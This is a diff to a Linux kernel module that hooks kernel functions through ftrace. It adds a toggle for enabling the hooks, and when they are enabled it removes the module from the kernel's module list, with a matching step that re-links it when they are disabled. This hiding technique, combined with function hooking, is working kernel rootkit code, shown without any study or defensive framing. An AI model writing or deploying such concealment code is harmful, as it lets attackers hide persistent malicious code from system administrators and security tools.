@@ -6,6 +6,9 @@
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 
+static char hooks_enabled = 0;
+static struct list_head *prev_mod;
+
 // callback used by ftrace when rip hits one of our traced funcs.
 // params allow checking for recursion by looking at rip & parent_rip
 static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip,
@@ -195,24 +198,58 @@ static struct hook hooks[HOOK_COUNT] = { (struct hook){
 int setup_hooks(void)
 {
     int i;
+    if (hooks_enabled)
+    {
+        pr_warn("hook: skipping setup, hooks are already enabled.\n");
+        return 0;
+    }
     for (i = 0; i < HOOK_COUNT; ++i)
     {
         int err = setup_hook(&hooks[i]);
         if (err)
         {
-            pr_err("hook: couldn't setup mkdir hook.\n");
+            pr_err("hook: couldn't setup hook for %s.\n", hooks[i].name);
             return 1;
         }
     }
+
+    // hide from modules list:
+    prev_mod = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+
+    hooks_enabled = 1;
     return 0;
 }
 
 int clear_hooks(void)
 {
     int i;
+    if (!hooks_enabled)
+    {
+        pr_warn("hook: skipping clearing, hooks are already disabled.\n");
+        return 0;
+    }
     for (i = 0; i < HOOK_COUNT; ++i)
     {
         remove_hook(&hooks[i]);
     }
+
+    // unhide from modules list:
+    list_add(&THIS_MODULE->list, prev_mod);
+
+    hooks_enabled = 0;
     return 0;
+}
+
+int toggle_hooks(void)
+{
+    if (hooks_enabled)
+    {
+        clear_hooks();
+    }
+    else
+    {
+        setup_hooks();
+    }
+    return hooks_enabled;
 }
